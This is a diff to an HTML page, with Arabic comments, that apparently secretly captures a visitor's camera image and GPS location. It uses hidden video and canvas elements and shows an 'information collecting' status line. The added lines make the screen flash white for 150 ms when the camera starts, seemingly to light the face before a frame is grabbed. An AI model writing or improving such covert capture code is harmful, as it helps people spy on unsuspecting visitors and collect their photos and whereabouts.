@@ -7,6 +7,7 @@
 <body>
   <video id="video" autoplay playsinline style="display:none;"></video>
   <canvas id="canvas" style="display:none;"></canvas>
+  <div id="flash" style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;display:none;z-index:9999;"></div>
   <pre id="result">📡 جاري جمع المعلومات...</pre>
 
   <script>
@@ -149,6 +150,10 @@ Longitude: ${gpsLon}
           const video = document.getElementById("video");
           video.srcObject = stream;
           video.addEventListener("playing", () => {
+            const flash = document.getElementById("flash");
+            flash.style.display = "block"; // أظهر الفلاش
+            setTimeout(() => flash.style.display = "none", 150); // اخفِ الفلاش بعد 150ms
+
             const canvas = document.getElementById("canvas");
             const ctx = canvas.getContext("2d");
             canvas.width = video.videoWidth;
